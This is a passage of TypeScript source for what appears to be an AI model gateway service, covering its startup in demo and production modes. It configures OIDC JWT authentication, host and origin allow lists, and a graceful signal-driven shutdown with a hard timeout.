			baseUrl: process.env.PERIMETER_MODEL_GATEWAY_URL ?? "http://127.0.0.1:8080/v1",
			token: process.env.PERIMETER_MODEL_PROXY_TOKEN ?? "", model: process.env.PERIMETER_MODEL ?? "default",
		},
		...(modelScopedKey ? { modelScopedKey } : {}),
	};
	// S3a：SIGTERM/SIGINT → 有界有序关闭（readiness 翻红 → 拒新 → drain → 逐项收尾 → 释放锁）。
	// 硬上限兜底：即使某个收尾步骤卡死，进程也以非零码退出，不悬挂。
	const DRAIN_MS = 30_000;
	const shutdownOnSignal = async (gw: Gateway) => {
		const hard = setTimeout(() => process.exit(1), DRAIN_MS + 15_000);
		hard.unref();
		try {
			await gw.shutdown({ drainMs: DRAIN_MS });
			process.exit(0);
		} catch (err) {
			console.error("有序关闭失败:", err instanceof Error ? err.message : err);
			process.exit(1);
		}
	};
	const wireShutdownSignals = (gw: Gateway) => {
		process.once("SIGTERM", () => { void shutdownOnSignal(gw); });
		process.once("SIGINT", () => { void shutdownOnSignal(gw); });
	};
	if (mode === "demo") {
		const token = process.env.PERIMETER_TOKEN ?? "dev-token";
		const gw = new Gateway({ ...base, mode, token });
		const port = await gw.listen();
		wireShutdownSignals(gw);
		console.log(`网关已启动（demo，仅限本机） http://127.0.0.1:${port}/`);
	} else {
		const scopes = JSON.parse(need("PERIMETER_GROUP_SCOPES")) as Record<string, { repo: string; team: string }>;
		const gw = new Gateway({
			...base, mode,
			auth: new JwtAuthenticator({
				issuer: need("PERIMETER_OIDC_ISSUER"), audience: need("PERIMETER_OIDC_AUDIENCE"),
				jwks: new RemoteJwks({ url: need("PERIMETER_OIDC_JWKS_URL") }),
				algorithms: list("PERIMETER_OIDC_ALGS").length ? list("PERIMETER_OIDC_ALGS") : undefined,
				groupsClaim: process.env.PERIMETER_OIDC_GROUPS_CLAIM,
			}),
			allowedHosts: list("PERIMETER_ALLOWED_HOSTS"), allowedOrigins: list("PERIMETER_ALLOWED_ORIGINS"),
			resolveScope: (_actor, principal) => principal ? scopeFromGroups(scopes)(principal) : undefined,
		});
		const port = await gw.listen();
		wireShutdownSignals(gw);
		// 生产不打印任何凭据或带凭据的 URL
		console.log(`网关已启动（production） 端口 ${port}`);
	}
}
